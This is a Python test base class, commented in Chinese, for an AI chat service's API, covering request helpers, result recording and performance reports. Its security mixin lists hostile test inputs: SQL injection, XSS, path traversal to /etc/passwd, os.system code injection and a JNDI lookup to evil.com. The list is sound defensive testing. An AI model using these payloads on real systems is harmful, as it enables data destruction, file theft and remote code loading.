#!/usr/bin/env python3
"""
AI助手测试基础类
提供通用测试功能和工具方法
"""
import asyncio
import logging
import time
import json
import aiohttp
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, asdict
from enum import Enum
import sys
import os

# 添加项目路径
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'python'))

from models.schemas import ChatRequest, ChatResponse


class TestResult(Enum):
    """测试结果枚举"""
    PASS = "PASS"
    FAIL = "FAIL"
    SKIP = "SKIP"
    ERROR = "ERROR"


@dataclass
class TestCase:
    """测试用例数据结构"""
    name: str
    description: str
    input_data: Dict[str, Any]
    expected_output: Dict[str, Any]
    category: str
    priority: str = "MEDIUM"  # HIGH, MEDIUM, LOW
    timeout: int = 30  # 超时时间（秒）
    setup_required: bool = False
    cleanup_required: bool = False


@dataclass 
class TestMetrics:
    """测试指标数据结构"""
    response_time_ms: int
    token_count: int
    model_used: str
    memory_usage_mb: float
    cpu_usage_percent: float
    success: bool
    error_message: Optional[str] = None


class BaseTestSuite:
    """测试套件基类"""
    
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.session_id = f"test-session-{int(time.time())}"
        self.logger = self._setup_logger()
        self.test_results: List[Dict] = []
        self.metrics: List[TestMetrics] = []
        
    def _setup_logger(self) -> logging.Logger:
        """设置日志记录器"""
        logger = logging.getLogger(f"{self.__class__.__name__}")
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter(
                '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
            )
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger
    
    async def setup(self):
        """测试套件初始化"""
        self.logger.info(f"🚀 初始化测试套件: {self.__class__.__name__}")
        
    async def teardown(self):
        """测试套件清理"""
        self.logger.info(f"🧹 清理测试套件: {self.__class__.__name__}")
        
    async def send_chat_request(self, message: str, session_id: Optional[str] = None,
                              stream: bool = False, max_tokens: int = 1000) -> Dict[str, Any]:
        """发送聊天请求"""
        data = {
            "message": message,
            "session_id": session_id or self.session_id,
            "stream": stream,
            "max_tokens": max_tokens
        }
        
        start_time = time.time()
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    f"{self.base_url}/api/v1/chat", 
                    json=data, 
                    timeout=30
                ) as response:
                    
                    response_time = int((time.time() - start_time) * 1000)
                    
                    if response.status == 200:
                        result = await response.json()
                        result['_response_time_ms'] = response_time
                        return result
                    else:
                        error_text = await response.text()
                        return {
                            "error": f"HTTP {response.status}: {error_text}",
                            "_response_time_ms": response_time
                        }
                        
        except Exception as e:
            response_time = int((time.time() - start_time) * 1000)
            return {
                "error": f"请求异常: {str(e)}",
                "_response_time_ms": response_time
            }
    
    async def send_stream_request(self, message: str, session_id: Optional[str] = None) -> Dict[str, Any]:
        """发送流式聊天请求"""
        data = {
            "message": message,
            "session_id": session_id or self.session_id,
            "stream": True
        }
        
        start_time = time.time()
        full_content = ""
        chunk_count = 0
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    f"{self.base_url}/api/v1/chat/stream",
                    json=data,
                    timeout=60
                ) as response:
                    
                    if response.status == 200:
                        async for chunk in response.content.iter_chunked(1024):
                            chunk_text = chunk.decode('utf-8').strip()
                            if chunk_text:
                                full_content += chunk_text
                                chunk_count += 1
                        
                        response_time = int((time.time() - start_time) * 1000)
                        return {
                            "content": full_content,
                            "chunk_count": chunk_count,
                            "_response_time_ms": response_time,
                            "stream": True
                        }
                    else:
                        error_text = await response.text()
                        return {
                            "error": f"HTTP {response.status}: {error_text}",
                            "_response_time_ms": int((time.time() - start_time) * 1000)
                        }
                        
        except Exception as e:
            return {
                "error": f"流式请求异常: {str(e)}",
                "_response_time_ms": int((time.time() - start_time) * 1000)
            }
    
    async def get_system_status(self) -> Dict[str, Any]:
        """获取系统状态"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{self.base_url}/api/v1/system/status") as response:
                    if response.status == 200:
                        return await response.json()
                    else:
                        return {"error": f"HTTP {response.status}"}
        except Exception as e:
            return {"error": f"系统状态请求异常: {str(e)}"}
    
    async def get_health_status(self) -> Dict[str, Any]:
        """获取健康状态"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{self.base_url}/health") as response:
                    if response.status == 200:
                        return await response.json()
                    else:
                        return {"error": f"HTTP {response.status}"}
        except Exception as e:
            return {"error": f"健康检查请求异常: {str(e)}"}
    
    def record_test_result(self, test_case: TestCase, result: TestResult, 
                          metrics: Optional[TestMetrics] = None, 
                          details: Optional[Dict] = None):
        """记录测试结果"""
        test_record = {
            "test_name": test_case.name,
            "category": test_case.category,
            "result": result.value,
            "description": test_case.description,
            "timestamp": time.time(),
            "details": details or {}
        }
        
        if metrics:
            test_record["metrics"] = asdict(metrics)
            self.metrics.append(metrics)
        
        self.test_results.append(test_record)
        
        # 输出测试结果
        status_icon = {
            TestResult.PASS: "✅",
            TestResult.FAIL: "❌", 
            TestResult.SKIP: "⏭️",
            TestResult.ERROR: "💥"
        }
        
        self.logger.info(f"{status_icon[result]} {test_case.name}: {result.value}")
        if details and details.get('error'):
            self.logger.error(f"   错误详情: {details['error']}")
    
    def generate_test_report(self) -> Dict[str, Any]:
        """生成测试报告"""
        if not self.test_results:
            return {"error": "没有测试结果"}
        
        total_tests = len(self.test_results)
        passed = sum(1 for r in self.test_results if r['result'] == 'PASS')
        failed = sum(1 for r in self.test_results if r['result'] == 'FAIL')
        errors = sum(1 for r in self.test_results if r['result'] == 'ERROR')
        skipped = sum(1 for r in self.test_results if r['result'] == 'SKIP')
        
        # 计算性能指标
        response_times = [m.response_time_ms for m in self.metrics if m.response_time_ms > 0]
        avg_response_time = sum(response_times) / len(response_times) if response_times else 0
        
        report = {
            "summary": {
                "total_tests": total_tests,
                "passed": passed,
                "failed": failed,
                "errors": errors,
                "skipped": skipped,
                "success_rate": f"{(passed/total_tests)*100:.1f}%" if total_tests > 0 else "0%"
            },
            "performance": {
                "avg_response_time_ms": round(avg_response_time, 2),
                "min_response_time_ms": min(response_times) if response_times else 0,
                "max_response_time_ms": max(response_times) if response_times else 0
            },
            "details": self.test_results
        }
        
        return report
    
    def print_test_summary(self):
        """打印测试摘要"""
        report = self.generate_test_report()
        summary = report["summary"]
        performance = report["performance"]
        
        self.logger.info("=" * 60)
        self.logger.info("📊 测试结果摘要")
        self.logger.info(f"✅ 通过: {summary['passed']}")
        self.logger.info(f"❌ 失败: {summary['failed']}")
        self.logger.info(f"💥 错误: {summary['errors']}")
        self.logger.info(f"⏭️ 跳过: {summary['skipped']}")
        self.logger.info(f"📈 成功率: {summary['success_rate']}")
        self.logger.info(f"⏱️ 平均响应时间: {performance['avg_response_time_ms']}ms")
        self.logger.info("=" * 60)
    
    async def run_test_case(self, test_case: TestCase):
        """运行单个测试用例（需子类实现）"""
        raise NotImplementedError("子类必须实现 run_test_case 方法")
    
    async def run_all_tests(self, test_cases: List[TestCase]):
        """运行所有测试用例"""
        await self.setup()
        
        try:
            for test_case in test_cases:
                try:
                    await self.run_test_case(test_case)
                except Exception as e:
                    self.logger.error(f"测试用例 {test_case.name} 执行异常: {e}")
                    self.record_test_result(
                        test_case, 
                        TestResult.ERROR,
                        details={"error": str(e)}
                    )
                
                # 测试间隔
                await asyncio.sleep(0.5)
        
        finally:
            await self.teardown()
            self.print_test_summary()


class PerformanceTestMixin:
    """性能测试混入类"""
    
    def measure_performance(self, func):
        """性能测量装饰器"""
        async def wrapper(*args, **kwargs):
            start_time = time.time()
            result = await func(*args, **kwargs)
            end_time = time.time()
            
            # 记录性能数据
            execution_time = (end_time - start_time) * 1000  # 转换为毫秒
            self.logger.info(f"⏱️ {func.__name__} 执行时间: {execution_time:.2f}ms")
            
            return result
        return wrapper
    
    def assert_performance(self, actual_time_ms: int, expected_max_ms: int, test_name: str):
        """性能断言"""
        if actual_time_ms <= expected_max_ms:
            self.logger.info(f"✅ {test_name} 性能达标: {actual_time_ms}ms <= {expected_max_ms}ms")
            return True
        else:
            self.logger.warning(f"⚠️ {test_name} 性能不达标: {actual_time_ms}ms > {expected_max_ms}ms")
            return False


class SecurityTestMixin:
    """安全测试混入类"""
    
    MALICIOUS_INPUTS = [
        "'; DROP TABLE users; --",  # SQL注入
        "<script>alert('xss')</script>",  # XSS
        "../../../etc/passwd",  # 路径遍历
        "__import__('os').system('ls')",  # 代码注入
        "' OR '1'='1",  # SQL注入变体
        "${jndi:ldap://evil.com/a}",  # JNDI注入
    ]
    
    async def test_malicious_inputs(self, endpoint_func):
        """测试恶意输入"""
        results = []
        
        for malicious_input in self.MALICIOUS_INPUTS:
            try:
                result = await endpoint_func(malicious_input)
                
                # 检查是否正确处理了恶意输入
                if "error" in result:
                    results.append({"input": malicious_input, "handled": True, "response": result})
                else:
                    # 检查响应中是否包含原始恶意代码（表示未正确处理）
                    response_content = str(result.get("content", "")).lower()
                    if malicious_input.lower() in response_content:
                        results.append({"input": malicious_input, "handled": False, "response": result})
                    else:
                        results.append({"input": malicious_input, "handled": True, "response": result})
                        
            except Exception as e:
                results.append({"input": malicious_input, "handled": True, "error": str(e)})
        
        return results